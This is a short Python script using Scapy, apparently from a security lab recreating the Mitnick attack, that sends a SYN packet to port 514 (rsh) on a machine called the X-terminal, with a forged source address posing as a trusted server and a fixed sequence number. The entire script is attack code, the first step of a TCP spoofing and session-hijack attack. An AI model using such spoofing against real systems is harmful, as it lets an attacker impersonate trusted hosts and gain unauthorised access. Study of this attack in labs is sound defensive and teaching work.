#!usr/bin/python3

from scapy.all import *

print("Sending Spoofed SYN packet to X-terminal (victim)")
ip = IP(src="192.168.12.6", dst="192.168.12.5") #src is trusted server and dst is victim
tcp = TCP(sport=1023,dport=514,flags="S", seq=123456789)
pkt = ip/tcp
send(pkt,verbose=0)
